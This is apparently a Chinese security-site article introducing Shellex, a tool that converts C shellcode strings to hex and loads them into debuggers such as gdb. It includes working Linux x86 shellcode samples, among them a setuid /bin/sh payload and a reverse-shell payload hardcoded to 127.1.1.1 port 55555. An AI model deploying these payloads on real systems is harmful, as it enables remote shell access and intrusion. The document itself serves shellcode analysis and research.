![](https://image.3001.net/images/20210227/1614431400_603a44a8966da590cd1c2.jpg!small)

## Shellex

Shellex是一款功能强大的C-shellcode转换器，可以帮助广大研究人员将C-shellcode转换为十六进制代码，并且能够在gdb、windbg、radare2、ollydbg、x64dbg、immunity调试器和010编辑器中粘贴和执行shellcode。

在Shellex的帮助下，广大研究人员可以将C-shellcode代码转换为十六进制代码，并且还可以在C编译器中编译时进行转换，整个过程只需要执行Shellex，并将shellcode代码拷贝进去并按下回车键即可。

比如说，我们可以转换多行混合了ASCII代码的C-shellcode（注意混合部分\x68//sh\x68/bin\x89）：

    
    
    "\x6a\x17\x58\x31\xdb\xcd\x80"
    
    "\x6a\x0b\x58\x99\x52\x68//sh\x68/bin\x89\xe3\x52\x53\x89\xe1\xcd\x80"

 **Shellex输出如下：**

    
    
    6A 17 58 31 DB CD 80 6A 0B 58 99 52 68 2F 2F 73 68 68 2F 62 69 6E 89 E3 52 53 89 E1 CD 80

 **转换包含注释代码的C-shellcode：**

    
    
    "\x68"
    
    "\x7f\x01\x01\x01"  // <- IP:  127.1.1.1
    
    "\x5e\x66\x68"
    
    "\xd9\x03"          // <- Port: 55555
    
    "\x5f\x6a\x66\x58\x99\x6a\x01\x5b\x52\x53\x6a\x02"
    
    "\x89\xe1\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79"
    
    "\xf9\xb0\x66\x56\x66\x57\x66\x6a\x02\x89\xe1\x6a"
    
    "\x10\x51\x53\x89\xe1\xcd\x80\xb0\x0b\x52\x68\x2f"
    
    "\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53"
    
    "\xeb\xce"

 **Shellex输出如下：**

    
    
    68 7F 01 01 01 5E 66 68 D9 03 5F 6A 66 58 99 6A 01 5B 52 53 6A 02 89 E1 CD 80 93 59 B0 3F CD 80 49 79 F9 B0 66 56 66 57 66 6A 02 89 E1 6A 10 51 53 89 E1 CD 80 B0 0B 52 68 2F 2F 73 68 68 2F 62 69 6E 89 E3 52 53 EB CE

如果你需要Shellex输出新的C-shellcode字符串，可以使用-h参数，比如说：

    
    
    ./shellex -h 6A 17 58 31 DB CD 80 6A 0B 58 99 52 68 2F 2F 73 68 68 2F 62 69 6E 89 E3 52 53 89 E1 CD 80
    
     
    
    \x6A\x17\x58\x31\xDB\xCD\x80\x6A\x0B\x58\x99\x52\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x52\x53\x89\xE1\xCD\x80

## Shellex安装

首先，广大研究人员需要使用下列代码将该项目源码克隆至本地：

    
    
    git clone https://github.com/David-Reguera-Garcia-Dreg/shellex.git

 **针对Windows：**

    
    
    shellex\bins\shellex.exe

 **针对Linux：**

    
    
    sudo apt-get install tcc
    
    shellex/linuxbins/shellex

## 在gdb中复制和执行shellcode

首先，我们需要运行Shellex。

接下来，输入我们的shellcode：

    
    
    "\x6a\x17\x58\x31\xdb\xcd\x80"
    
    "\x6a\x0b\x58\x99\x52\x68//sh\x68/bin\x89\xe3\x52\x53\x89\xe1\xcd\x80"

按下回车键后，再按下Control+D键。

使用shellex -h命令将Shellex输出转换为C-Hex字符串：

    
    
    shellex -h 6A 17 58 31 DB CD 80 6A 0B 58 99 52 68 2F 2F 73 68 68 2F 62 69 6E 89 E3 52 53 89 E1 CD 80

将C-Hex字符串以源码形式（包含“echo”命令）写入至文件：

    
    
    echo -ne "\x6A\x17\x58\x31\xDB\xCD\x80\x6A\x0B\x58\x99\x52\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x52\x53\x89\xE1\xCD\x80" > /tmp/sc

接下来，将源码文件写入当前指令指针。

 **32位：**

    
    
    restore /tmp/sc binary $eip
    
    x/30b $eip
    
    x/15i $eip

 **64位：**

    
    
    restore /tmp/sc binary $rip
    
    x/30b $rip
    
    x/15i $rip

x/30b是shellcode的字节大小，我们可以使用下列命令获取到大小值：

    
    
    wc -c /tmp/sc

x/15i是显示的指令数量，我们可以使用ndisasm获取正确的数量：

    
    
    sudo apt-get install nasm

 **32位：**

    
    
    ndisasm -b32 /tmp/sc
    
    ndisasm -b32 /tmp/sc | wc -l

 **64位：**

    
    
    ndisasm -b64 /tmp/sc
    
    ndisasm -b64 /tmp/sc | wc -l

## 无交互模式

在Linux中转换“\x6a\x17\x58\x31\xdb\xcd\x80”：

    
    
    echo "\"\\x6a\\x17\\x58\\x31\\xdb\\xcd\\x80\"" | shellex

在Windows中转换“\x6a\x17\x58\x31\xdb\xcd\x80”：

    
    
    echo "\x6a\x17\x58\x31\xdb\xcd\x80" | shellex.exe

 **Windows下写入多行文件：**

    
    
    C:\Users\Dreg\Desktop\shellex\bins>type sc.txt
    
    "\x6a\x17\x58\x31\xdb\xcd\x80"
    
    "\x6a\x0b\x58\x99\x52\x68//sh\x68/bin\x89\xe3\x52\x53\x89\xe1\xcd\x80"
    
    C:\Users\Dreg\Desktop\shellex\bins>type sc.txt | shellex.exe

 **Linux下写入多行文件：**

    
    
    dreg@fr33project# cat sc.txt
    
    "\x6a\x17\x58\x31\xdb\xcd\x80"
    
    "\x6a\x0b\x58\x99\x52\x68//sh\x68/bin\x89\xe3\x52\x53\x89\xe1\xcd\x80"
    
    dreg@fr33project# cat sc.txt | shellex

## 项目地址

Shellex：【[ _GitHub传送门_](https://github.com/David-Reguera-Garcia-Dreg/shellex)】

